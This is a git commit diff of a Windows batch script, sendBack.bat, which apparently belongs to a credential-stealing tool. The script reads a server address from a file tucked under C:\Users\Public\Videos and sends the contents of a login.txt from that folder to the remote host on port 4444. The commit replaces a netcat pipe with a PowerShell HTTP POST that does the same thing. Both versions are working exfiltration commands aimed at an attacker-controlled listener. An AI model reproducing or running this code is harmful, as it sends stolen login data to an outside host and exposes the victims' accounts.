323724c6e2ad326c7f398a7e38d8e6ff9484c019
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-29 15:24:04 +0100

    Update sendBack.bat

--- sendBack.bat
+++ sendBack.bat
@@ -1,6 +1,7 @@
 @echo off
 set /p SERVER_IP=<C:\Users\Public\Videos\GraphicalUserInterface\url.txt
 
-echo Sending data from login.txt to netcat listener...
-type C:\Users\Public\Videos\GraphicalUserInterface\login.txt | nc %SERVER_IP% 4444
+echo Sending data from login.txt to server...
+powershell -Command "(Get-Content C:\Users\Public\Videos\GraphicalUserInterface\login.txt) | Invoke-WebRequest -Uri http://%SERVER_IP%:4444 -Method POST -ContentType 'text/plain' -Body (Get-Content -Raw C:\Users\Public\Videos\GraphicalUserInterface\login.txt)"
 echo Data sent.
+pause
